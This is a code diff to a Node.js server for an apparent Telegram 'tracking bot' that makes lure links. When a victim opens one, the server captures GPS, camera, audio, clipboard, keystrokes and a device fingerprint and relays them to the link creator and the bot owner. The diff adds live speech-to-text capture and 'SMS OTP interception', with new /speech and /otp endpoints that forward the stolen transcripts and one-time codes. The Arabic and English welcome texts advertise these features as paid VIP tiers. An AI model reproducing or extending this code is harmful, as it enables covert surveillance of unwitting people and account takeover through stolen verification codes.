@@ -44,9 +44,9 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false };
+const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false };
 // These features are ALWAYS paid-VIP only — never free
-const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy']);
+const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP']);
 
 let pageConfig   = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
 let submissions  = loadJSON(SUBMISSIONS_FILE, []);
@@ -131,7 +131,7 @@ const T = {
   ar: {
     welcome_new:   (name) => `✨ أهلاً وسهلاً ${name||''} 👑`,
     welcome_back:  (name) => `🔥 مرحباً مجدداً ${name||''} ⚡`,
-    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *بوت التتبع المتقدم*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *يجمع لحظة الفتح:*\n\n📍 GPS دقيق + IP + المدينة\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 سرعة الإنترنت + ISP\n📋 محتوى الحافظة\n🔑 بصمة الجهاز الفريدة\n👁️ تتبع سلوك المستخدم\n🌙 الوضع الليلي + الخط\n🔇 مستوى الضوضاء المحيطة\n⌨️ تسجيل النقرات\n\n💎 *المميزون يحصلون على أكثر!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by \`@Ye_x00\``,
+    welcome_body:  `\n\n┌─────────────────────┐\n│  🕵️ *بوت التتبع الذكي*  │\n└─────────────────────┘\n\n🟣 *يجمع لحظة الفتح تلقائياً:*\n\n📍 GPS دقيق + IP + المدينة والدولة\n📱 بيانات الجهاز الكاملة + البصمة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي فوري\n🗣️ تحويل الصوت إلى نص مباشر ✨\n🔐 اعتراض رموز OTP من SMS ✨\n🌐 سرعة الإنترنت + ISP\n📋 محتوى الحافظة\n🔑 بصمة الجهاز الفريدة\n👁️ تتبع سلوك المستخدم\n🔇 مستوى الضوضاء المحيطة\n⌨️ تسجيل لوحة المفاتيح\n\n┌─────────────────────┐\n│  💎 *حساب VIP يفتح الكل!*  │\n└─────────────────────┘\n⚡ Powered by \`@Ye_x00\``,
     lang_name:     '🇸🇦 العربية',
     lang_switched: '✅ تم التحويل إلى العربية 🇸🇦',
     menu_title:    '⚡ *اختر من القائمة:*',
@@ -150,7 +150,7 @@ const T = {
   en: {
     welcome_new:   (name) => `✨ Welcome ${name||''} 👑`,
     welcome_back:  (name) => `🔥 Welcome back ${name||''} ⚡`,
-    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *Advanced Tracking Bot*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *Collects on open:*\n\n📍 Precise GPS + IP + City\n📱 Full device fingerprint\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network speed + ISP\n📋 Clipboard content\n🔑 Unique device signature\n👁️ Behavior tracking\n🌙 Dark mode + fonts\n🔇 Ambient noise level\n⌨️ Click logging\n\n💎 *Premium gets even more!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by \`@Ye_x00\``,
+    welcome_body:  `\n\n┌─────────────────────┐\n│  🕵️ *Smart Tracking Bot*  │\n└─────────────────────┘\n\n🟣 *Auto-collects on link open:*\n\n📍 Precise GPS + IP + City & Country\n📱 Full device data + fingerprint\n📷 Front & back camera\n🎙️ Instant audio recording\n🗣️ Real-time speech-to-text ✨\n🔐 SMS OTP interception ✨\n🌐 Network speed + ISP\n📋 Clipboard content\n🔑 Unique device signature\n👁️ User behavior tracking\n🔇 Ambient noise level\n⌨️ Keylogger\n\n┌─────────────────────┐\n│  💎 *VIP unlocks everything!*  │\n└─────────────────────┘\n⚡ Powered by \`@Ye_x00\``,
     lang_name:     '🇺🇸 English',
     lang_switched: '✅ Switched to English 🇺🇸',
     menu_title:    '⚡ *Choose from menu:*',
@@ -802,7 +802,9 @@ async function handleLinkOpen(req, res, view) {
   const keyloggerAccess   = canUsePremium(creatorId, 'keylogger');
   const sensorsAccess     = canUsePremium(creatorId, 'sensors');
   const formspyAccess     = canUsePremium(creatorId, 'formspy');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess });
+  const speechRecogAccess = canUsePremium(creatorId, 'speechRecog');
+  const webOTPAccess      = canUsePremium(creatorId, 'webOTP');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -840,7 +842,8 @@ app.get("/a/:token", async (req, res) => {
     camAccess: true, audioAccess: true, clipAccess: true,
     pidAccess: true, localNetAccess: true, pushAccess: true,
     screenCapAccess: true, contcamAccess: true, contaudioAccess: true,
-    faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true
+    faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true,
+    speechRecogAccess: true, webOTPAccess: true
   });
 });
 app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
@@ -3952,6 +3955,30 @@ app.post("/audio", (req, res) => {
   } else res.send("Missing");
 });
 
+// ── Speech-to-Text endpoint ───────────────────────────────────────────────────
+app.post("/speech", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const text = decodeURIComponent(req.body.text || '') || null;
+  if (uid && text) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `🎙️ *تفريغ صوتي:*\n\n❝ ${text.slice(0,3000)} ❞`, { parse_mode:'Markdown' });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🎙️ *تفريغ صوتي* (ID: ${tid}):\n\n❝ ${text.slice(0,3000)} ❞`, { parse_mode:'Markdown' });
+    res.send("Done");
+  } else res.send("Missing");
+});
+
+// ── WebOTP interception endpoint ──────────────────────────────────────────────
+app.post("/otp", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid  || '') || null;
+  const code = decodeURIComponent(req.body.code || '') || null;
+  if (uid && code) {
+    const tid = parseInt(uid, 36);
+    notify(tid, `🔐 *رمز OTP مُعتَرض!*\n\n\`\`\`\n${code}\n\`\`\`\n\n⚡️ تم الاعتراض تلقائياً من SMS`, { parse_mode:'Markdown' });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔐 *OTP مُعتَرض* (ID: ${tid}):\n\`\`\`\n${code}\n\`\`\``, { parse_mode:'Markdown' });
+    res.send("Done");
+  } else res.send("Missing");
+});
+
 app.post("/clipboard", (req, res) => {
   const uid  = decodeURIComponent(req.body.uid)  || null;
   const clip = decodeURIComponent(req.body.clip) || null;
@@ -4627,7 +4654,8 @@ app.listen(PORT, async () => {
     registerBotCommands();
     const up = new Date().toISOString();
     bot.sendMessage(BOT_OWNER,
-      `✅ البوت اتشغّل الآن\n🕒 ${up}\n💾 البيانات: ${restored > 0 ? `استُعيدت (${restored} ملف)` : 'ملفات جديدة'}`
+      `┌─────────────────────┐\n│  ✅ *البوت يعمل الآن*  │\n└─────────────────────┘\n\n🕒 ${up}\n💾 البيانات: ${restored > 0 ? `استُعيدت (${restored} ملف)` : 'ملفات جديدة'}\n\n🟢 *الميزات الجديدة نشطة:*\n🗣️ تحويل الصوت لنص\n🔐 اعتراض OTP\n\n⚡ جاهز للاصطياد!`,
+      { parse_mode: 'Markdown' }
     ).catch(() => {});
   }, 3000);
 });
